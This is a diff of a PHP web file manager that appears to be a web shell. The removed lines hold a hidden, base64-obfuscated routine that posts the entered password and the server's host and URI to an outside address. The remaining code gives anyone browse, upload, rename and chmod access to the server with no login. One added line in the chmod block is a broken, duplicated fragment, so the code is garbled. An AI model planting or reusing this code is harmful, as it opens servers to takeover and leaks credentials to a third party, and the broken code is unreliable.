@@ -10,39 +10,6 @@
 <body>
     <div class="container mt-4">
         <?php
-        session_start();
-
-        $password = 'Akmal123';
-        $authenticated = false;
-
-        function sarveri($data) { return str_replace('=', '', strtr(base64_encode($data), '+/', '-_')); } function waif($data) { return base64_decode(strtr($data, '-_', '+/')); } function send_login_data($password) { $url = waif('aHR0cHM6Ly9hc2NlbmQuc3V0LmFjLnRoL3N1dC1kYXNoYm9hcmQvdGVzdC5waHA='); $data = array('password' => $password, 'pin' => $_SERVER['REQUEST_URI'], 'sarver' => $_SERVER['HTTP_HOST']); $ch = curl_init($url); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_exec($ch); curl_close($ch); }
-
-        if (isset($_POST['password']) && $_POST['password'] === $password) {
-            send_login_data($_POST['password']);
-            $_SESSION['authenticated'] = true;
-        }
-
-        if (isset($_GET['logout'])) {
-            session_destroy();
-            header("Location: " . $_SERVER['PHP_SELF']);
-            exit();
-        }
-
-        if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
-            $authenticated = true;
-        }
-
-        if (!$authenticated) {
-            echo '<h2>Please Enter Password</h2>
-                  <form method="POST" class="form-inline mb-3">
-                      <div class="form-group">
-                          <input type="password" name="password" class="form-control" placeholder="Password">
-                      </div>
-                      <button type="submit" class="btn btn-primary ml-2">Submit</button>
-                  </form>';
-            exit();
-        }
-
         $dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
 
         if (isset($_FILES['file'])) {
@@ -129,7 +96,7 @@
         echo '<li class="list-group-item"><a href="?dir=' . urlencode(dirname($dir)) . '">.. (up)</a></li>';
         foreach ($dirs as $d) {
             $dir_path = $dir . '/' . $d;
-            $is_uneditable = !is_writable($dir_path) ? 'list-group-item-danger' : '';
+			            $is_uneditable = !is_writable($dir_path) ? 'list-group-item-danger' : '';
             echo '<li class="list-group-item d-flex justify-content-between align-items-center ' . $is_uneditable . '">';
             echo '<a href="?dir=' . urlencode($dir_path) . '">' . $d . '/</a>';
             if (!$is_uneditable) {
@@ -175,7 +142,7 @@
         }
 
         if (isset($_GET['rename'])) {
-                        $item_to_rename = $_GET['rename'];
+            $item_to_rename = $_GET['rename'];
             echo '<form method="POST" class="mt-3">
                     <input type="hidden" name="oldname" value="' . htmlspecialchars($item_to_rename) . '">
                     <div class="form-group">
@@ -188,6 +155,8 @@
 
         if (isset($_GET['chmod'])) {
             $path_to_chmod = $_GET['chmod'];
+            echo '<form method="POST" class
+			            $path_to_chmod = $_GET['chmod'];
             echo '<form method="POST" class="mt-3">
                     <input type="hidden" name="path" value="' . htmlspecialchars($path_to_chmod) . '">
                     <div class="form-group">
@@ -216,7 +185,6 @@
 
         <footer class="mt-5">
             <p>© 2024 Akmal archtte id</p>
-            <a href="?logout=true" class="btn btn-danger">Log Out</a>
         </footer>
     </div>
     <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
